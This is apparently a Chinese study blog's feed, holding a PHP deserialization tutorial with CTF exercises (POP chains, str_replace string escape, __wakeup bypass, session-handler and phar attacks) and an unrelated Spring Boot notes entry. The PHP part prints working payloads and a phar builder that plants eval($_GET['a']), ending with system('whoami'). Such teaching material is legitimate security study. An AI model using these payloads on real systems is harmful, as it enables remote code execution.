例题 &lt;?phphighlight_file(__FILE__);error_reporting(0);class User &#123;    const SITE = &#x27;uusama&#x27;;    public $username;    public $nickname;    private $password;    private $order;    public function __wakeup() &#123;        system($this-&gt;username);//漏洞    &#125;&#125;$user_ser = $_GET[&#x27;benben&#x27;];//需要构造一个含有username的序列化字符串unserialize($user_ser);?&gt;

思路:构造get参数为一个含有username的序列化字符串，username值为任意命令																		payload:  ?benben=O:4:&quot;User&quot;:1:&#123;s:8:&quot;username&quot;;s:20:&quot;echo &quot;hello world!&quot;;&quot;;&#125;
toString和invokefunction __toString();/*触发时机：把对象当作字符串调用;调用对象要使用var_dump()或print_r(),使用echo或print就会调用__toString()功能：参数：返回值：字符串*/function __invoke();/*触发时机：把对象当作方法(函数)调用功能：参数：返回值：字符串*/&lt;?phpclass User&#123;	public $id;	public $username;	private $password;	public function __construct($id = null,$username = null,$password = null)&#123;		$this-&gt;id = $id;		$this-&gt;username = $username;		$this-&gt;password = $password;	&#125;	public function __tostring()&#123;		return &#x27;这不是字符串!&#x27;;	&#125;	public function __invoke()&#123;		return &#x27;这不是方法!!&#x27;;	&#125;&#125;$a = new User(1,&#x27;a&#x27;,&#x27;c&#x27;);echo $a;//输出这不是字符串echo $a();//输出这不是方法?&gt;

错误调用相关魔术方法call
function __call($arg1,$arg2);/*触发时机:调用不存在的成员方法功能：参数:$arg1:方法名 $arg2:参数值的数组返回值:无*/&lt;?phpclass User&#123;	public $id;	public $username;	private $password;	public function __construct($id = null,$username = null,$password = null)&#123;		$this-&gt;id = $id;		$this-&gt;username = $username;		$this-&gt;password = $password;	&#125;	public function __call($arg1,$arg2)&#123;		echo $arg1.&quot;\n&quot;;		for($i = 0;$i &lt; count($arg2); ++$i)&#123;//把传进去的所有参数打印出来			echo $arg2[$i].&quot;\n&quot;;		&#125;	&#125;&#125;$a = new User();$a-&gt;test(&#x27;a&#x27;,&#x27;b&#x27;,&#x27;c&#x27;);//会调用call()?&gt;/*testabc*/

callStatic
function __callStatic($arg1,$arg2);/*php中调用成员常量或静态调用: ::$arg1:方法名	$arg2:参数值的数组*/&lt;?phpclass User&#123;	public $id;	public $username;	private $password;	public function __construct($id = null,$username = null,$password = null)&#123;		$this-&gt;id = $id;		$this-&gt;username = $username;		$this-&gt;password = $password;	&#125;	public static function __callStatic($arg1,$arg2)&#123;		echo $arg1.&quot;\n&quot;;		for($i = 0;$i &lt; count($arg2); ++$i)&#123;			echo $arg2[$i].&quot;\n&quot;;		&#125;	&#125;&#125;$a = new User();$a::test(&#x27;a&#x27;,&#x27;b&#x27;,&#x27;c&#x27;);?&gt;

get
&lt;?phperror_reporting(0);class User&#123;	public $id;	public $username;	private $password;	public function __construct($id = null, $username = null, $password = null)	&#123;		$this-&gt;id = $id;		$this-&gt;username = $username;		$this-&gt;password = $password;	&#125;	public function __get($arg1)	&#123;		echo $arg1;	&#125;&#125;$a = new User();$a-&gt;var2;?&gt;

set
&lt;?phperror_reporting(0);class User&#123;	public $id;	public $username;	private $password;	public function __construct($id = null, $username = null, $password = null)	&#123;		$this-&gt;id = $id;		$this-&gt;username = $username;		$this-&gt;password = $password;	&#125;	public function __set($arg1,$arg2)&#123;		echo $arg1.$arg2;	&#125;&#125;$a = new User();$a-&gt;var2 = &#x27;111&#x27;;//会输出var2111?&gt;

isset
/*arg1就是不可访问变量的属性名*/&lt;?phperror_reporting(0);class User&#123;	public $id;	public $username;	private $password;	public function __construct($id = null, $username = null, $password = null)	&#123;		$this-&gt;id = $id;		$this-&gt;username = $username;		$this-&gt;password = $password;	&#125;	public function __isset($arg1)&#123;		echo $arg1;	&#125;&#125;$a = new User();isset($a-&gt;password);//私有成员不可访问empty($a-&gt;password);?&gt;

unset
clone
&lt;?phperror_reporting(0);class User&#123;	public $id;	public $username;	private $password;	public function __construct($id = null, $username = null, $password = null)	&#123;		$this-&gt;id = $id;		$this-&gt;username = $username;		$this-&gt;password = $password;	&#125;	public function __clone()&#123;		echo &#x27;cloned!&#x27;;	&#125; &#125;$a = new User();$b = clone($a);//输出cloned!?&gt;

总结表

pop链前置知识 &lt;?phphighlight_file(__FILE__);error_reporting(0);class index &#123;    private $test;    public function __construct()&#123;        $this-&gt;test = new normal();    &#125;    public function __destruct()&#123;        $this-&gt;test-&gt;action();    &#125;&#125;class normal &#123;    public function action()&#123;        echo &quot;please attack me&quot;;    &#125;&#125;class evil &#123;    var $test2;    public function action()&#123;        eval($this-&gt;test2);//&lt;-漏洞    &#125;&#125;unserialize($_GET[&#x27;test&#x27;]);?&gt;

反推法1.先找漏洞在哪，eval()函数处有漏洞2.eval调用evil的$test23.但是单单unserialize()并不会调用evil的action()4.unserialize()会调用__destruct()5.但是__destruct()中的$test是normal的实例6.要想办法构造序列化字符串使index中的$test变成evil的实例

构造序列化字符串
方法1:直接改代码加注释，在类里赋值，让php帮忙跑出想要的序列化字符串
&lt;?php// highlight_file(__FILE__);error_reporting(0);class index&#123;	private $test;	public function __construct()	&#123;		$this-&gt;test = new evil();	&#125;	// public function __destruct()	// &#123;	// 	$this-&gt;test-&gt;action();	// &#125;&#125;// class normal// &#123;// 	public function action()// 	&#123;// 		echo &quot;please attack me&quot;;// 	&#125;// &#125;class evil&#123;	var $test2 = &#x27;echo &quot;Hello World!&quot;;&#x27;;	// public function action()	// &#123;	// 	eval($this-&gt;test2);	// &#125;&#125;// unserialize($_GET[&#x27;test&#x27;]);echo urlencode(serialize(new index()));?&gt;

方法2:在类外进行赋值
&lt;?phphighlight_file(__FILE__);error_reporting(0);class index&#123;	public $test;//偷偷改成public，如果是private就只能用第一种方式&#125;class evil&#123;	var $test2;&#125;$a = new evil();$a-&gt;test2 = &#x27;system(&quot;ls&quot;)&#x27;;$b = new index();$b-&gt;test = $a;echo serialize($b);?&gt;

魔术方法触发规则触发前提：魔术方法所在的类或对象被调用
eg:
 &lt;?phphighlight_file(__FILE__);error_reporting(0);class fast &#123;    public $source;    public function __wakeup()&#123;        echo &quot;wakeup is here!!&quot;;        echo  $this-&gt;source;//如果要触发toString(),这里的source就得是sec的对象    &#125;&#125;class sec &#123;    var $benben;    public function __tostring()&#123;        echo &quot;tostring is here!!&quot;;    &#125;&#125;$b = $_GET[&#x27;benben&#x27;];unserialize($b);?&gt;

目标:显示tostring is here!!

//生成序列化字符串的url编码&lt;?phperror_reporting(0);class fast&#123;	public $source;&#125;class sec&#123;	var $benben;&#125;$a = new fast();$b = new sec();$a-&gt;source = $b;echo urlencode(serialize($a));//输出O%3A4%3A%22fast%22%3A1%3A%7Bs%3A6%3A%22source%22%3BO%3A3%3A%22sec%22%3A1%3A%7Bs%3A6%3A%22benben%22%3BN%3B%7D%7D?&gt;

构造url,?benben=O%3A4%3A%22fast%22%3A1%3A%7Bs%3A6%3A%22source%22%3BO%3A3%3A%22sec%22%3A1%3A%7Bs%3A6%3A%22benben%22%3BN%3B%7D%7D
先执行wakeup()再执行toString()
POP链构造与POC编写
eg:
 &lt;?php//flag is in flag.phphighlight_file(__FILE__);error_reporting(0);class Modifier &#123;    private $var;    public function append($value)    &#123;        include($value);        echo $flag;//1.目的要输出$flag    &#125;    public function __invoke()&#123;//2.触发__invoke()调用append()并把$var设置成flag.php        $this-&gt;append($this-&gt;var);    &#125;&#125;class Show&#123;    public $source;    public $str;    public function __toString()&#123;        return $this-&gt;str-&gt;source;//4.如果把$str赋值为Test，Test中没有source成员，就会触发__get()    &#125;    public function __wakeup()&#123;//6.最终unserialize()触发__wakeup()        echo $this-&gt;source;//5.触发toString(),把自己作为变量赋值给$source    &#125;&#125;class Test&#123;    public $p;    public function __construct()&#123;        $this-&gt;p = array();    &#125;    public function __get($key)&#123;        $function = $this-&gt;p;        return $function();//3.如果把$p变成Modifier,调用__get()就会触发Modifier的__invoke()    &#125;&#125;if(isset($_GET[&#x27;pop&#x27;]))&#123;    unserialize($_GET[&#x27;pop&#x27;]);&#125;?&gt; 

第一步：触发invoke，使$var = &#39;flag.php&#39;
第二步：触发get，给$p赋值为对象Modifier
第三步：触发toString，给$str赋值为对象Test
第四步：触发wakeup，给source赋值为自己的对象
因为wakeup在Show中，所以我们构造序列化字符串中传递的参数就是Show
&lt;?php//flag is in flag.php// highlight_file(__FILE__);error_reporting(0);class Modifier &#123;    private $var = &#x27;flag.php&#x27;;//私有属性就不能在外赋值了&#125;class Show&#123;    public $source;    public $str;&#125;class Test&#123;    public $p;&#125;$a  = new Modifier();$b = new Show();$c = new Test();$b-&gt;source = $b;$b-&gt;str = $c;$c-&gt;p = $a;echo urlencode(serialize($b));?&gt; 

把url编码后的序列化字符串作为参数传入?pop=
得到flag：&#96;&#96; ctfstu&#123;5c202c62-7567-4fa0-a370-134fe9d16ce7&#125;

字符串逃逸利用str_replace()
/** * @param array|string $search 要被替换的 * @param array|string $replace 要替换的 * @param array|string $subject 替换的对象 * @return void */function str_replace(array|string $search, array|string $replace, array|string $subject);


反序列化时，属性长度不对，成员数量不对都无法进行序列化，会显示bool(false)
&lt;?phperror_reporting(0);class Test&#123;	public $a;	public $b;&#125;$a=new Test();// echo serialize($a);// $ser_str = &#x27;O:4:&quot;Test&quot;:2:&#123;s:1:&quot;a&quot;;N;s:1:&quot;b&quot;;N;&#125;&#x27;;$ser_str = &#x27;O:4:&quot;Test&quot;:1:&#123;s:1:&quot;a&quot;;N;s:1:&quot;b&quot;;N;&#125;&#x27;;//成员数量不对var_dump(unserialize($ser_str));?&gt;&lt;!--bool(false)--&gt;&lt;?phperror_reporting(0);class Test&#123;	public $a;    public $b;&#125;$a=new Test();// echo serialize($a);// $ser_str = &#x27;O:4:&quot;Test&quot;:2:&#123;s:1:&quot;a&quot;;N;s:1:&quot;b&quot;;N;&#125;&#x27;;$ser_str = &#x27;O:4:&quot;Test&quot;:2:&#123;s:1111:&quot;a&quot;;N;s:1:&quot;b&quot;;N;&#125;&#x27;;//长度不对var_dump(unserialize($ser_str));?&gt;&lt;!--bool(false)--&gt;

如果反序列化时，忽略了某个存在的变量，序列化字符串中加上新的变量，最终反序列化结果会包含被忽略的变量和序列化字符串中的变量
&lt;?phperror_reporting(0);class Test&#123;	public $a;	public $b;&#125;$a=new Test();// echo serialize($a);// $ser_str = &#x27;O:4:&quot;Test&quot;:2:&#123;s:1:&quot;a&quot;;N;s:1:&quot;b&quot;;N;&#125;&#x27;;$ser_str = &#x27;O:4:&quot;Test&quot;:2:&#123;s:1:&quot;a&quot;;N;s:1:&quot;c&quot;;N;&#125;&#x27;;var_dump(unserialize($ser_str));?&gt;&lt;!--object(Test)#2 (3) &#123;  [&quot;a&quot;]=&gt;  NULL  [&quot;b&quot;]=&gt;  NULL  [&quot;c&quot;]=&gt;  NULL&#125;&gt;

为什么长度一定不能错?

/*反序列化结束符为;&#125;*/&lt;?phperror_reporting(0);class Test&#123;	public $a;	public $b;	public $c = &#x27;c&#x27;;&#125;$a = new Test();$ser_str = &#x27;O:4:&quot;Test&quot;:2:&#123;s:1:&quot;a&quot;;N;s:1:&quot;b&quot;;N;&#125;s:1:&quot;c&quot;;&quot;ccc&quot;;&#125;&#x27;;var_dump(unserialize($ser_str));/*object(Test)#2 (3) &#123;  [&quot;a&quot;]=&gt;  NULL  [&quot;b&quot;]=&gt;  NULL  [&quot;c&quot;]=&gt;  string(1) &quot;c&quot;&#125;*/?&gt;

减少
&lt;?phpclass Test&#123;	public $a;	public $b = &#x27;abcsystem&#x27;;	public $c;&#125;$str = serialize(new Test());/*$str = &#x27;O:4:&quot;Test&quot;:3:&#123;s:1:&quot;a&quot;;N;s:1:&quot;b&quot;;s:9:&quot;abcsystem&quot;;s:1:&quot;c&quot;;N;&#125;&#x27;*/$str = str_replace(&#x27;system&#x27;,&quot;&quot;,$str);/*$str = &#x27;O:4:&quot;Test&quot;:3:&#123;s:1:&quot;a&quot;;N;s:1:&quot;b&quot;;s:9:*/&quot;abc&quot;;s:1:&quot;&quot;/*&quot;c&quot;;N;&#125;&#x27;*/ //没注释的地方是会被当成$b的值的地方var_dump(unserialize($str));?&gt;



就是构造成员变量的值，在str_replace()的时候，能刚好吃掉不想要的，能够构造我们的命令
先把我们要执行的命令写好，这样便于构造长度
//eg&lt;?phpclass Test&#123;	public $a = &#x27;abcsystem&#x27;;	public $b = &#x27;构造的表达式&#x27;;&#125;$str = serialize(new Test());echo &quot;$str\n&quot;;&#x27;O:4:&quot;Test&quot;:2:&#123;s:1:&quot;a&quot;;s:9:&quot;abcsystem&quot;;s:1:&quot;b&quot;;s:?:&quot;构造的表达式&quot;;&#125;&#x27;;//要吃到构造的表达式所处的第一个&quot;?&gt;/*19个字符要3个system*/&lt;?phpclass Test&#123;	public $a = &#x27;abcsystemsystemsystem&#x27;;	public $b = &#x27;12&quot;;s:1:&quot;b&quot;;s:20:&quot;echo &quot;hello world!&quot;;&quot;;&#125;&#x27;;//用;&#125;直接截断&#125;$str = serialize(new Test());echo &quot;$str\n&quot;;&#x27;O:4:&quot;Test&quot;:2:&#123;s:1:&quot;a&quot;;s:21:&quot;abcsystemsystemsystem&quot;;s:1:&quot;b&quot;;s:37:&quot;s:1:&quot;b&quot;;s:20:&quot;echo &quot;hello world!&quot;;&quot;;&#125;&quot;;&#125;&#x27;;//截到构造的表达式前只有19个字符，还要再在构造的表达式前补上2个字符(21 - 19 = 2)和&quot;;$str = str_replace(&#x27;system&#x27;,&#x27;&#x27;,$str);$str = &#x27;O:4:&quot;Test&quot;:2:&#123;s:1:&quot;a&quot;;s:21:&quot;abc&quot;;s:1:&quot;b&quot;;s:37:&quot;12&quot;;s:1:&quot;b&quot;;s:20:&quot;echo &quot;hello world!&quot;;&quot;;&#125;&quot;;&#125;&#x27;;var_dump(unserialize($str));?&gt;  /*object(Test)#1 (2) &#123;  [&quot;a&quot;]=&gt;  string(21) &quot;abc&quot;;s:1:&quot;b&quot;;s:37:&quot;12&quot;  [&quot;b&quot;]=&gt;  string(20) &quot;echo &quot;hello world!&quot;;&quot;&#125;*/

例题&lt;?phperror_reporting(0);function filter($name)&#123;	$safe = array(&quot;flag&quot;, &quot;php&quot;);	$name = str_replace($safe, &quot;hk&quot;, $name);	return $name;&#125;class test&#123;	var $user;	var $pass;	var $vip = false;	function __construct($user, $pass)	&#123;		$this-&gt;user = $user;		$this-&gt;pass = $pass;	&#125;&#125;$param = $_GET[&#x27;user&#x27;];$pass = $_GET[&#x27;pass&#x27;];$param = serialize(new test($param, $pass));$profile = unserialize(filter($param));if ($profile-&gt;vip) &#123;	echo file_get_contents(&quot;flag.php&quot;);&#125;?&gt;

思路,三个属性,构造第一个属性,使它能吃掉剩下属性的值,在第二个属性中构造表达式使vip=true
&lt;?phpclass test&#123;	var $user = &quot;php&quot;;	var $pass = &quot;&quot;;	var $vip;&#125;echo serialize(new test());?&gt;//O:4:&quot;test&quot;:3:&#123;s:4:&quot;user&quot;;s:3:&quot;php&quot;;s:4:&quot;pass&quot;;s:0:&quot;&quot;;s:3:&quot;vip&quot;;N;&#125;/*从user值吃到pass值的前一个&quot;,需要18个字符(除去最开始的php),php经过filter变成hk减少一个字符,一共需要18个php才能正确吃完让$user = 18个php让$pass = &quot;;s:4:&quot;pass&quot;;N;s:3:&quot;vip&quot;;b:1;&#125;构造url,得到flag*/


增多
用str_replace(),替换成一个更长的字符串，把多余的字符吐出来
&lt;?phpclass Test&#123;	public $a = &#x27;a&#x27;;	public $b = &#x27;b&#x27;;&#125;$a = new Test();$str = serialize($a);//&#x27;O:4:&quot;Test&quot;:2:&#123;s:1:&quot;a&quot;;s:1:&quot;a&quot;;s:1:&quot;b&quot;;s:1:&quot;b&quot;;&#125;&#x27;;$str = str_replace(&#x27;a&#x27;,&#x27;aaa&#x27;,$str);// echo &quot;$str\n&quot;;/*&#x27;O:4:&quot;Test&quot;:2:&#123;s:1:&quot;a*/aa/*&quot;;s:1:&quot;a&quot;;s:1:&quot;b&quot;;s:1:&quot;b&quot;;&#125;&#x27;;*/ //多出来的aa就是吐出的多余代码?&gt;

思路：把吐出来的多余代码构造成功能性代码
构造的字符串:&quot;;s:1:&quot;b&quot;:s:?:&quot;&quot;;&#125;   用;&#125;结束反序列化，不用管原功能性代码
构造的字符串长度为x，将ls替换成pwd会吐一个字符出来，需要x个pwd，这样就能吐x个字符出来，与前面长度正确对应，功能性代码被正确吐出

class Test&#123;	public $a = &#x27;ls&#x27;;	public $b = &#x27;b&#x27;;&#125;$a = new Test();echo serialize($a).&quot;\n&quot;;?&gt;/*想构造一个显示hello world,构造字符串&quot;;s:1:&quot;b&quot;;s:20:&quot;echo &quot;hello world!&quot;;&quot;;&#125; 长度为39将ls用pwd替换,吐出一个字符,所以我们需要39个ls,替换后才能吐出39个字符,让功能性代码正确吐出*/&lt;?phpclass Test&#123;	public $a = &#x27;lslslslslslslslslslslslslslslslslslslslslslslslslslslslslslslslslslslslslslsls&#x27;;//39个ls	public $b = &#x27;b&#x27;;&#125;$a = new Test();$hacker = &#x27;&quot;;s:1:&quot;b&quot;;s:20:&quot;echo &quot;hello world!&quot;;&quot;;&#125;&#x27;;$a-&gt;a = $a-&gt;a.$hacker;$str = serialize($a);echo &quot;$str\n&quot;;$str = str_replace(&#x27;ls&#x27;,&#x27;pwd&#x27;,$str);echo &quot;$str\n&quot;;// &#x27;O:4:&quot;Test&quot;:2:&#123;s:1:&quot;a&quot;;s:114:&quot;pwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwd&quot;;s:1:&quot;b&quot;;s:20:&quot;echo &quot;hello world!&quot;;&quot;;&quot;;s:1:&quot;b&quot;;s:1:&quot;b&quot;;&#125;&#x27;;var_dump(unserialize($str));?&gt;

例题&lt;?php// highlight_file(__FILE__);error_reporting(0);function filter($name)&#123;	$safe = array(&quot;flag&quot;, &quot;php&quot;);	$name = str_replace($safe, &quot;hack&quot;, $name);	return $name;&#125;class test&#123;	var $user;	var $pass = &#x27;daydream&#x27;;	function __construct($user)	&#123;		$this-&gt;user = $user;	&#125;&#125;$param = $_GET[&#x27;param&#x27;];$param = serialize(new test($param));$profile = unserialize(filter($param));if ($profile-&gt;pass == &#x27;escaping&#x27;) &#123;	echo file_get_contents(&quot;flag.php&quot;);&#125;?&gt;

目标:判断pass是否为escaping;用filter将php换成hack达到字符串增多
目标逃逸代码:&quot;;s:4:&quot;pass&quot;;s:8:&quot;escaping&quot;;&#125;,29个字符,所以需要29个php
构造参数?param=phpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphp%22%3Bs%3A4%3A%22pass%22%3Bs%3A8%3A%22escaping%22%3B%7D
得到flag

wakeup魔术方法绕过
例题 &lt;?phperror_reporting(0);class secret&#123;    var $file=&#x27;index.php&#x27;;    public function __construct($file)&#123;        $this-&gt;file=$file;    &#125;    function __destruct()&#123;        include_once($this-&gt;file);        echo $flag;    &#125;    function __wakeup()&#123;        $this-&gt;file=&#x27;index.php&#x27;;    &#125;&#125;$cmd=$_GET[&#x27;cmd&#x27;];if (!isset($cmd))&#123;    highlight_file(__FILE__);&#125;else&#123;    if (preg_match(&#x27;/[oc]:\d+:/i&#x27;,$cmd))&#123;        echo &quot;Are you daydreaming?&quot;;    &#125;    else&#123;        unserialize($cmd);    &#125;&#125;//sercet in flag.php?&gt;

分析:要绕过__wakeup(),O:后面不能跟数字以绕过正则表达式
&lt;?phpclass secret&#123;	var $file = &#x27;flag.php&#x27;;&#125;echo serialize(new secret()).&quot;\n&quot;;//获取原序列化字符串echo urlencode(&#x27;O:+6:&quot;secret&quot;:2:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;&#x27;);//在数字前加上+绕过正则表达式,把属性数改大绕过wakeup?&gt;

拿到flag

引用php中引用为 &amp;
&lt;?phpclass Test&#123;	public $a;	public $b;&#125;$test = new Test();$test-&gt;a = &amp;$test-&gt;b; // a是b的引用echo serialize($test).&quot;\n&quot;;/*O:4:&quot;Test&quot;:2:&#123;s:1:&quot;a&quot;;N;s:1:&quot;b&quot;;R:2;&#125;*/?&gt;



例题&lt;?phphighlight_file(__FILE__);error_reporting(0);include(&quot;flag.php&quot;);class just4fun &#123;    var $enter;    var $secret;&#125;if (isset($_GET[&#x27;pass&#x27;])) &#123;    $pass = $_GET[&#x27;pass&#x27;];    $pass=str_replace(&#x27;*&#x27;,&#x27;\*&#x27;,$pass);&#125;$o = unserialize($pass);if ($o) &#123;    $o-&gt;secret = &quot;*&quot;;    if ($o-&gt;secret === $o-&gt;enter)        echo &quot;Congratulation! Here is my secret: &quot;.$flag;    else        echo &quot;Oh no... You can&#x27;t fool me&quot;;&#125;else echo &quot;are you trolling?&quot;;?&gt;


这题中传入引用即可
&lt;?php// highlight_file(__FILE__);error_reporting(0);include(&quot;flag.php&quot;);class just4fun &#123;    var $enter;    var $secret;&#125;$a = new just4fun();$a-&gt;enter = &amp;$a-&gt;secret;echo serialize($a);?&gt;


session反序列化漏洞一个页面写入session，一个页面读出session





例题no.1
//写入session &lt;?phphighlight_file(__FILE__);error_reporting(0);ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php_serialize&#x27;);session_start();$_SESSION[&#x27;ben&#x27;] = $_GET[&#x27;a&#x27;];?&gt; 

//读出session&lt;?php highlight_file(__FILE__);error_reporting(0);ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php&#x27;);session_start();class D&#123;    var $a;    function __destruct()&#123;        eval($this-&gt;a);//漏洞所在    &#125;&#125;?&gt; 

以php_serialize方式写入,以php方式读出,php方式键名|序列化字符串,所以构造参数时要加|
构造参数 ?a=|O:1:&quot;D&quot;:1:&#123;s:1:&quot;a&quot;;s:20:&quot;echo &quot;hello world!&quot;;&quot;;&#125;
no.2
//写入session &lt;?phphighlight_file(__FILE__);error_reporting(0);ini_set(&#x27;session.serialize_handler&#x27;, &#x27;php_serialize&#x27;);session_start();$_SESSION[&#x27;a&#x27;] = $_GET[&#x27;a&#x27;];?&gt; 

//读出session&lt;?phphighlight_file(__FILE__);/*hint.php*/session_start();class Flag&#123;    public $name;    public $her;    function __wakeup()&#123;        $this-&gt;her=md5(rand(1, 10000));        if ($this-&gt;name===$this-&gt;her)&#123;            include(&#x27;flag.php&#x27;);            echo $flag;        &#125;    &#125;&#125;?&gt; 

分析:需要用到引用,以php_serialize方式写入session,php方式读出
构造参数?a=|O:4:&quot;Flag&quot;:2:&#123;s:4:&quot;name&quot;;N;s:3:&quot;her&quot;;R:2;&#125;;
phar反序列化漏洞

重点关注manifest这个字段
manifest字段格式

24byte后是序列化的字符串
漏洞原理
例题no.1
 &lt;?phphighlight_file(__FILE__);class Testobj&#123;    var $output=&#x27;&#x27;;&#125;@unlink(&#x27;test.phar&#x27;);   //删除之前的test.par文件(如果有)$phar=new Phar(&#x27;test.phar&#x27;);  //创建一个phar对象，文件名必须以phar为后缀$phar-&gt;startBuffering();  //开始写文件$phar-&gt;setStub(&#x27;&lt;?php __HALT_COMPILER(); ?&gt;&#x27;);  //写入stub$o=new Testobj();$o-&gt;output=&#x27;eval($_GET[&quot;a&quot;]);&#x27;;$phar-&gt;setMetadata($o);//写入meta-data$phar-&gt;addFromString(&quot;test.txt&quot;,&quot;test&quot;);  //添加要压缩的文件$phar-&gt;stopBuffering();?&gt; &lt;?phphighlight_file(__FILE__);error_reporting(0);class Testobj&#123;    var $output=&quot;echo &#x27;ok&#x27;;&quot;;    function __destruct()    &#123;        eval($this-&gt;output);    &#125;&#125;if(isset($_GET[&#x27;filename&#x27;]))&#123;    $filename=$_GET[&#x27;filename&#x27;];    var_dump(file_exists($filename));&#125;?&gt; 

分析:phar中manifest的值是对Testobj中$output=eval($_GET[&#39;a&#39;])进行序列化后得到的字符串,反序列化必然会调用__destruct(),相当于eval(eval($_GET[&#39;a&#39;])),执行了eval($_GET[&#39;a&#39;]),所以要传入两个参数,$filename处就可以传入phar伪协议参数,??filename=phar://test.phar&amp;a=system(&#39;whoami&#39;);
]]></content>
      <categories>
        <category>Web安全</category>
        <category>PHP反序列化</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>Java-web</title>
    <url>/2025/05/24/javaweb/</url>
    <content><![CDATA[nginx打包部署#vue项目目录下npm run build

打包好后会有一个dist文件夹
部署：将dist复制到nginx的&#x2F;html中,启动nginx.exe 占用80端口（默认）


若端口被占用,在nginx.conf里更改
Maven





依赖配置
&lt;dependencies&gt;        &lt;dependency&gt;                &lt;groupId&gt;ch.qos.logback&lt;/groupId&gt;                &lt;artifactId&gt;logback-classic&lt;/artifactId&gt; &lt;!--先写这个,其他idea可以代码提示--&gt;                &lt;version&gt;1.5.6&lt;/version&gt;        &lt;/dependency&gt;&lt;/dependencies&gt;


依赖传递
排除依赖依赖范围
生命周期



SpringBoot






@RestController@RestController 通常用于创建 REST API,其中每个方法的返回值都是 HTTP 响应体的一部分。这使得开发人员可以专注于业务逻辑,而不必担心视图解析和模型数据的填充。
@RequestMapping()注解在 Java 的 Spring 框架中,@RequestMapping注解用于将 HTTP 请求映射到控制器的处理方法上。这个注解可以用于类或方法上,用于定义请求的 URL 模式、HTTP 方法（如 GET、POST）、请求参数、头部信息等。

package com.example.demo.controller;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.RestController;//请求处理类@RestControllerpublic class HelloController &#123;        //请求路径        @RequestMapping(&quot;/Hello&quot;)        public String Hello()&#123;                return &quot;Hello SpringBoot&quot;;        &#125;&#125;

HTTP协议

请求数据格式请求行,请求头,请求体

请求头与请求体之间用空行隔开

常见请求头：
User-Agent用于浏览器兼容性处理
响应数据格式相应行,响应头,响应体&#x2F;响应正文

状态码


最常见:
常见响应头
Web服务器-Tomcat
基本使用

端口冲突解决：
程序解析
创建springboot项目时要关联start.spring.io,所以创建时需要联网



起步依赖的版本依赖于父工程,版本依赖于父工程版本

Spring Boot-Web的maven依赖中已经内嵌了tomcat


请求响应请求
HttpServletRequest称为请求对象
HttpServletResponse称为响应对象

DispatcherServlet称为前端控制器&#x2F;核心控制器

postman工具
简单参数 
package com.example.demo.controller;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.RestController;@RestControllerpublic class RequestController &#123;        @RequestMapping(&quot;/Args&quot;)        //请求的参数名与接收参数名必须一致,不然接收到的就是null        public String RequestController(String name,String passwd)&#123;                String response = name+&#x27;:&#x27;+passwd;                System.out.println(response);                return response;        &#125;&#125;




package com.example.demo.controller;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.RequestParam;import org.springframework.web.bind.annotation.RestController;@RestControllerpublic class RequestController &#123;        @RequestMapping(&quot;/Args&quot;)        //请求的参数名与接收参数名必须一致,不然接收到的就是null        public String RequestController(@RequestParam(name = &quot;name&quot;,required = true)String name, @RequestParam(name = &quot;passwd&quot;) String password)&#123;                String response = name+&#x27;:&#x27;+password;                System.out.println(response);                return response;        &#125;&#125;




实体参数
实体都放在pojo下（自己建目录）


至少要有请求参数

@RequestMapping(&quot;/simplePojo&quot;)public String simplyPojo(User user)&#123;    System.out.println(user);    return &quot;OK&quot;;&#125;


如果改变参数名字就不能封装进去,参数值为null


请求如下：




控制台输出
数组参数

@RequestMapping(&quot;/arrayParam&quot;)public String arrayParam(String[] param)&#123;    System.out.println(Arrays.toString(param));    return &quot;OK&quot;;&#125;


集合参数
不用@RequestParam会被解释成数组而非集合


日期参数


json参数
postman请求json参数方法：

url中要加上请求路径,否则报错

键名与形参对象属性名相同

使用@RequestBody标识
@RequestMapping(&quot;/jsonParam&quot;)       public String jsonParam(@RequestBody User user)&#123;               System.out.println(user);               return &quot;OK&quot;;       &#125;


路径参数单个路径

多个路径
响应@ResponseBody注解
响应字符串@RequestMapping(&quot;/str&quot;)public String stringResponse() &#123;    return &quot;Hello SpringBoot&quot;;&#125;


响应对象响应格式为json
@RequestMapping(&quot;/obj&quot;)public Address objResponse() &#123;    Address address = new Address();    address.setProvince(&quot;福建&quot;);    address.setCity(&quot;泉州&quot;);    return address;&#125;


响应集合响应格式为json数组
@RequestMapping(&quot;/List&quot;)public List&lt;Address&gt; listResponse() &#123;    Address address = new Address();    address.setProvince(&quot;福建&quot;);    address.setCity(&quot;泉州&quot;);    Address address2 = new Address();    address2.setProvince(&quot;福建&quot;);    address2.setCity(&quot;厦门&quot;);    List&lt;Address&gt; list = new ArrayList&lt;&gt;();    list.add(address2);    list.add(address);    return list;&#125;


统一响应结果上面三种响应格式都不同,不便于前后端开发


package com.example.demo.POJO;public class Result &#123;        //响应码 success:0 error:-1        private Integer code;        //提示信息        private String msg;        //返回数据        private Object data;        public Result() &#123;        &#125;        public Result(Integer code, String msg, Object data) &#123;                this.code = code;                this.msg = msg;                this.data = data;        &#125;        public Integer getCode() &#123;                return code;        &#125;        public void setCode(Integer code) &#123;                this.code = code;        &#125;        public String getMsg() &#123;                return msg;        &#125;        public void setMsg(String msg) &#123;                this.msg = msg;        &#125;        public Object getData() &#123;                return data;        &#125;        public void setData(Object data) &#123;                this.data = data;        &#125;        @Override        public String toString() &#123;                return &quot;Result&#123;&quot; +                        &quot;code=&quot; + code +                        &quot;, msg=&#x27;&quot; + msg + &#x27;\&#x27;&#x27; +                        &quot;, data=&quot; + data +                        &#x27;&#125;&#x27;;        &#125;        public static Result success(Object data)&#123;                return new Result(0,&quot;success&quot;,data);        &#125;                public static Result success()&#123;                return new Result(0,&quot;success&quot;,null);        &#125;                public static Result error(String errMsg)&#123;                return new Result(-1,errMsg,null);        &#125;&#125;

static方法用于快速构建Result对象
